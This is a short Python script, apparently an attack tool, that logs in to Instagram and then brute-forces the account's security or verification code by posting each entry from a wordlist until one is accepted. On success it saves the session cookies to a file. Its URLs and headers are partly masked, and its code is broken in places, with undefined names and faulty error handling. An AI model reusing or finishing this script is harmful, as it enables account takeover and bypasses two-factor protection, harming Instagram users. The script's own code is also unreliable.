import requests
import sys
import time
from lxml import html

''' I censured part of code, because is only for study time '''

def login_form():
	user="Username here"
	passwd="password here"
	url = "https://www.instagram.com:4*********s/login/ajax/"
	cookies = {"Censured"}
	headers = {"Censured"}
	data = {"username": user, "password": passwd, "queryParams": "{\"source\":\"auth_switcher\"}", "optIntoOneTap": "true"}
	response=session.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=True)
	time.sleep(4)
	return str(response.url)

def start_richiesta(url,code):
	url=url
	url = "https://www.instagram.com:4*********3JjsA/"
	cookies = {"Censured"}
	headers = {"Censured"}
	data = {"security_code": str(code)}
	response=session.post(burp0_url, headers=headers, cookies=cookies, data=data)
	doc = html.fromstring(response.text)
	if check_exists_by_xpath(doc):
		print("Codice errato")
		time.sleep(10)
	else:
		print("Codice corretto")
		f=open("Cookie","w")
		f.write("Cookie: "+response.cookies+"\n")
		f.write("Headers: "+response.headers+"\n")
		sys.exit()


def check_exists_by_xpath(html):
    try:
    	html.xpath("//p[contains(text(),'*******************************************+')]")
    except NoSuchElementException:
        return False
    return True


session = requests.session()
def main():
	try:
		while True:
			url=login_form()
			i=0
			with open("listGenInstagram.txt","r") as f:
				for code in f:
					start_richiesta(url,str(code))
					i+=1
	except KeyboardInterrupt:
		with open('Status.txt','w') as f:
			f.write(str(i+1))

if __name__ == '__main__':
	main()
